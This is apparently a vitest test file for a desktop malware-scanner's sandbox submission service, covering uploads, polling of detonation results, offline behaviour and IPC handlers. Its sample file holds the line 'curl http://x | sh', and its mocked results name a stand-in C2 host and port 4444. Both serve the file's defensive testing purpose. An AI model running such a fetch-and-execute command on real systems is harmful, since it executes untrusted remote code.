import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";

import { createHandlers } from "../src/core/handlers";
import { SandboxService } from "../src/core/sandbox-service";
import { uploadForFullScan } from "../src/engine/server";

async function sample(): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), "qalaa-sbx-"));
  const path = join(dir, "install.sh");
  await writeFile(path, "#!/bin/sh\ncurl http://x | sh\n");
  return path;
}

const scan = (over: Record<string, unknown>) =>
  new Response(JSON.stringify({ status: "completed", risk: "suspicious", details: {}, checks: [], ...over }), { headers: { "Content-Type": "application/json" } });

describe("sandbox runs from the desktop", () => {
  it("asks the server for a sandbox run with the file", async () => {
    const path = await sample();
    let form: FormData | null = null;
    const url = await uploadForFullScan("https://q.example/", path, (async (_u: RequestInfo | URL, init?: RequestInit) => {
      form = init?.body as FormData;
      return new Response(JSON.stringify({ id: "s1" }), { status: 202 });
    }) as typeof fetch, { runInSandbox: true });
    expect(url).toBe("https://q.example/scans/s1");
    expect(form!.get("run_in_sandbox")).toBe("true");
    expect((form!.get("file") as File).name).toBe("install.sh");
  });

  it("follows a run and shows what it tried to reach", async () => {
    const path = await sample();
    let calls = 0;
    const s = new SandboxService({
      server: () => "https://q.example",
      upload: async () => "https://q.example/scans/abc",
      fetcher: (async () => {
        calls++;
        return calls === 1
          ? scan({ status: "running" })
          : scan({ details: { detonation: { seconds: 2.5, timed_out: false, dns_lookups: ["c2.bad.test"], web_requests: ["GET c2.bad.test/gate.php"], direct_connections: ["203.0.113.7:4444"], programs: ["curl"] } }, checks: [{ key: "detonation", status: "completed" }] });
      }) as typeof fetch,
    });
    const run = await s.submit(path);
    expect(run).toMatchObject({ id: "abc", file: "install.sh", status: "queued" });
    expect((await s.list())[0]!.status).toBe("running");
    const [done] = await s.list();
    expect(done).toMatchObject({ status: "completed", risk: "suspicious", dnsLookups: ["c2.bad.test"], directConnections: ["203.0.113.7:4444"], programs: ["curl"], note: null });
    await s.list();
    expect(calls, "a finished run isn't fetched again").toBe(2);
  });

  it("says why there was no sandbox run, and keeps the last state when offline", async () => {
    const path = await sample();
    let online = true;
    const s = new SandboxService({
      server: () => "https://q.example",
      upload: async () => "https://q.example/scans/x1",
      fetcher: (async () => {
        if (!online) throw new Error("offline");
        return scan({ status: "running" });
      }) as typeof fetch,
    });
    await s.submit(path);
    await s.list();
    online = false;
    expect((await s.list())[0]!.status).toBe("running");
    online = true;
    const unavailable = new SandboxService({
      server: () => "https://q.example",
      upload: async () => "https://q.example/scans/x2",
      fetcher: (async () => scan({ checks: [{ key: "detonation", status: "unavailable", detail: "This server has no sandbox for running files set up, so the file was only inspected." }] })) as typeof fetch,
    });
    await unavailable.submit(path);
    expect((await unavailable.list())[0]!.note).toMatch(/no sandbox/);
  });

  it("refuses missing or oversized files and answers over IPC", async () => {
    const s = new SandboxService({ server: () => "https://q.example", upload: async () => "https://q.example/scans/z" });
    await expect(s.submit("/no/such/file")).rejects.toThrow(/doesn't exist/);
    await expect(s.submit(42)).rejects.toThrow(/Choose a file/);
    const failing = new SandboxService({ server: () => "https://q.example", upload: async () => Promise.reject(new Error("The server answered 413")) });
    await expect(failing.submit(await sample())).rejects.toThrow(/couldn't be sent: The server answered 413/);
    const handlers = createHandlers({ version: "t", homeInput: async () => ({}) as never, updateToggles: async () => {}, quickScan: async () => ({ scanned: 0, malicious: 0, suspicious: 0 }), updateSignatures: async () => {}, sandbox: s }, () => {});
    expect(await handlers["sandbox.submit"]!({ path: await sample() })).toMatchObject({ id: "z" });
    expect(await handlers["sandbox.list"]!(undefined)).toMatchObject({ runs: [{ id: "z" }] });
  });
});
